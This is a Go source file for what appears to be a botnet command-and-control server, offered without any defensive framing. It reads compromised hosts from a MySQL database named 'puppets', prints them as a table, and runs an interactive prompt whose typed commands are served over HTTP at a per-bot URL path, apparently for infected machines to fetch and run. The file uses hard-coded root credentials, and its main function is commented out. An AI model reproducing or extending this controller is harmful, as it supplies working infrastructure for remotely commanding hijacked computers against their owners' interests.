package main

import (
	"fmt"
	"database/sql"
	_ "github.com/go-sql-driver/mysql"
	"github.com/olekukonko/tablewriter"
	"os"
	"net/http"
	"bufio"
	"strings"
	_ "time"
)

type bot struct { 
	ip string
	os string
	host string
}

var command string = ""

func ListBots() { 
	var db *sql.DB
	var b bot
	var err error
	db, err = sql.Open("mysql", "root:root@tcp(127.0.0.1:3306)/puppets")
	defer db.Close()
	if err != nil { 
		fmt.Println(err.Error())
	}

	err = db.Ping()
	if err != nil {
		fmt.Println(err.Error())
	}

	rows, err := db.Query("SELECT ip, os, name FROM set1")
	defer rows.Close()
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"ip", "os", "name"})
	for rows.Next() { 
		err := rows.Scan(&b.ip, &b.os, &b.host)
		if err != nil { 
			panic(err)
		}
		data := [][]string{
			[]string{b.ip, b.os, b.host},
		}
		
		for _, v := range data {
			table.Append(v)
		}
		 // Send output
		//fmt.Println("↦", b.ip, b.os, b.host)
	}
	table.Render()

}

func InteractHandler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, command) }

func Interact(ip string) { 
	reader := bufio.NewReader(os.Stdin)
	//colorRed := "\033[31m"
	colorGreen := "\033[32m"
	url := "/" + ip

	fmt.Println(string(colorGreen), "interacting with: ", ip, "...")
	http.HandleFunc(url, InteractHandler)
	for{
		
		fmt.Print(string(colorGreen), "[~]-> ")
		text, _ := reader.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		command = text
		
		
	}
	
}

/*
func main() {
	
	fmt.Printf("Waiting for connections...\n")
	go http.ListenAndServe(":80", nil)
	Interact("192.168.1.1")
	
	
}
*/